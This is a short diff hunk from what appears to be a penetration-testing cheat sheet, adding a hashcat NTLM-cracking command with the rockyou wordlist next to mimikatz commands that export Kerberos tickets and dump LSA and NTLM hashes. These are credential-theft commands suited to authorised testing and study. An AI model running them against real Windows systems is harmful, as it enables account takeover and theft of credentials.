@@ -425,6 +425,7 @@ sekurlsa::tickets /export
 dump hash
 ```
 mimikatz # lsadump::lsa /patch
+hashcat -m 1000 <hash> rockyou.txt
 ```
 
 dump NTLM hash of admin account
